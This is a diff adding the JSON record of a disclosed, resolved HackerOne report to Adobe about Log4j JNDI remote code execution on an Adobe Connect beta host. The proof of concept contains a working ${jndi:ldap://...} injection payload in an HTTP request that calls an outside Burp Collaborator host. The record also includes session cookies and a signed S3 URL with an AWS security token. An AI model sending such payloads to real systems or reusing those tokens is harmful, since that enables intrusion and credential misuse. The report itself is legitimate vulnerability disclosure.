@@ -1,0 +1,128 @@
+{
+  "id": 1442644,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQyNjQ0",
+  "url": "https://hackerone.com/reports/1442644",
+  "title": "Log4j Java RCE in [beta.dev.adobeconnect.com]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-06T13:52:00.089Z",
+  "submitted_at": "2022-01-06T13:52:00.220Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sheikhrishad0",
+    "url": "/sheikhrishad0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hiu1oberdwtjn073lh1yr6i63ypb/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 347,
+    "url": "https://hackerone.com/adobe",
+    "handle": "adobe",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qtwRFSzn2th8Rz52AH2RfhZd/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/qtwRFSzn2th8Rz52AH2RfhZd/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Adobe",
+      "twitter_handle": "adobesecurity",
+      "website": "https://www.adobe.com/trust/security.html",
+      "about": "Adobe Vulnerability Disclosure Program and Magento Bug Bounty Program"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-03-21T16:26:11.645Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-03-20T17:30:19.678Z",
+  "team_member_agreed_on_going_public_at": "2022-03-21T16:26:11.333Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello Security Team,\n\n###Summary\nLog4j versions prior to 2.15.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.\nAs per Apache's Log4j security guide: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.\n\n###Platform Affected: [website]\nhttps://beta.dev.adobeconnect.com\n\n###Proof of concept:\n\n* Request:\n\n```javascript\nGET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1\nHost: beta.dev.adobeconnect.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\n```\n\n* Response:\n\n{F1569913}\n\n## Impact\n\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.\n\nRegards,\nSheikh rishad",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1569913,
+      "file_name": "PoC.jpeg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4u3w7auvrorzb2jagxgjqazt836d?response-content-disposition=attachment%3B%20filename%3D%22PoC.jpeg%22%3B%20filename%2A%3DUTF-8%27%27PoC.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142127Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=461d7c518114cc4db5d015e9f9318be671e95ad02723ec087d089f511cd5c26b",
+      "file_size": 116203,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 30,
+  "voters": [
+    "barbod",
+    "shreyaschavhan",
+    "anjal_giri",
+    "h3v0x",
+    "pudsec",
+    "alp",
+    "sheikhrishad0",
+    "yassinek3ch",
+    "fulldash",
+    "run_win",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 71342,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
